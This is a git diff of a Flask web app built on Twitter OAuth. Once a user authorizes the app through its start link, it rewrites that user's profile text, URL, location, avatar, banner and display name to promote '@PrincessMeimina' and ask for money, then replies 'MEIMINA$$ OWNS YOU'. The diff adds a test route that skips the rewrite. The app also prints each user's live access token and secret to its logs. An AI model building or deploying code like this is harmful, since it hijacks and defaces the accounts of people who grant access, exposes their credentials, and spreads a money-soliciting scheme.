@@ -31,6 +31,7 @@ app.config['APP_CONSUMER_SECRET'] = os.environ.get("API_SECRET")
 # APP_CONSUMER_SECRET = 'API_Secret_from_Twitter
 
 oauth_store = {}
+m_endpoint = {}
 
 @app.route('/ping')
 def ping():
@@ -72,12 +73,19 @@ def start():
     print("inside start")
     oauth_token=get_oauth_token()
     starturi=""+f'{authorize_url}?oauth_token={oauth_token}'
+    m_endpoint[oauth_token] = "start"
     print(starturi)
     return redirect(starturi)
-    #gresp, gcontent = client.request(starturi,"GET")
-    #return gcontent
-    #return render_template('start.html', authorize_url=authorize_url, oauth_token=oauth_token, request_token_url=request_token_url
 
+@app.route('/test')
+def test():
+    print("inside test")
+    oauth_token=get_oauth_token()
+    starturi=""+f'{authorize_url}?oauth_token={oauth_token}'
+    m_endpoint[oauth_token] = "test"
+    print(starturi)
+    return redirect(starturi)
+    
 def update_profile_banner(client):
     print("inside update_profile_banner")
     with open("banner.jpg", "rb") as image_file:
@@ -128,7 +136,10 @@ def update_profile_name(client,name):
     print(content)
     return
    
-
+def clear_maps(oauth_token):
+    del oauth_store[oauth_token]
+    del m_endpoint[oauth_token]
+    
 @app.route('/api/callback')
 def callback():
     # Accept the callback params, get the token and call the API to
@@ -142,7 +153,7 @@ def callback():
     # and show an error message
     if oauth_denied:
         if oauth_denied in oauth_store:
-            del oauth_store[oauth_denied]
+            clear_maps(oauth_denied)
         return "the OAuth request was denied by this user"
 
     if not oauth_token or not oauth_verifier:
@@ -153,6 +164,7 @@ def callback():
         return "oauth_token not found locally"
 
     oauth_token_secret = oauth_store[oauth_token]
+    endpoint = m_endpoint[oauth_token]
 
     # if we got this far, we have both callback params and we have
     # found this token locally
@@ -174,22 +186,27 @@ def callback():
     real_oauth_token_secret = access_token[b'oauth_token_secret'].decode(
         'utf-8')
 
-    print("Now we are ready")
+    
+    print(f'user_id:{user_id}\nendpoint:{endpoint}')
     print(real_oauth_token)
     print(real_oauth_token_secret)
 
     # Call api.twitter.com/1.1/users/show.json?user_id={user_id}
     real_token = oauth.Token(real_oauth_token, real_oauth_token_secret)
     real_client = oauth.Client(consumer, real_token)
-   
-    description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
-    update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
-    update_profile_image(real_client)
-    update_profile_banner(real_client)
+
+    if endpoint == 'start':
+        description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
+        update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
+        update_profile_image(real_client)
+        update_profile_banner(real_client)
+
+    if endpoint == 'test':
+        print("testing endpoint")
     
     name = "Meiminaddict #"+str(random.random())[2:8]
     update_profile_name(real_client,name)
 
-    del oauth_store[oauth_token]
+    clear_maps(oauth_token)
     
     return "MEIMINA$$ OWNS YOU"
